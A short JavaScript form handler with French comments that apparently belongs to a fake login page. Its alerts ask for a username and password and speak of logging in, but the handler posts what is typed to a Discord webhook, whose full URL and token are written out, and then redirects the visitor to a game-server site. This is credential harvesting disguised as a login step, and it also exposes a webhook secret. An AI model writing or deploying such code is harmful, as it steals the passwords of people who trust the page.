document.getElementById('messageForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // Récupérer les valeurs du pseudo et du message
    const pseudo = document.getElementById('pseudo').value.trim();
    const message = document.getElementById('message').value.trim();

    // Vérifier que le pseudo et le message ne sont pas vides
    if (!pseudo || !message) {
        alert('Veuillez entrer un pseudo et un mot de passe.');
        return;
    }

    // Créer le message au format "pseudo : message"
    const formattedMessage = `${pseudo} : ${message}`;

    // L'URL de votre Webhook (exemple)
    const webhookURL = 'https://discord.com/api/webhooks/1304133820924170313/O6Xd--gjD3TEKfNEPIWSHPwhpNF2i2ixef3v2mnhYq7FhStUGkqWb_47PAEPpCGxKEp6';

    // Préparer les données à envoyer
    const payload = {
        content: formattedMessage // Utiliser le message formaté
    };

    // Envoyer les données au Webhook
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            alert('Vous allez être redirigé!');
            window.location.href = 'https://eternalmc.wstr.fr/'; // Remplacer par l'URL de la redirection
        } else {
            alert('Erreur lors de la connexion.');
        }
    })
    .catch(error => {
        alert('Erreur de connexion : ' + error.message);
    });
});
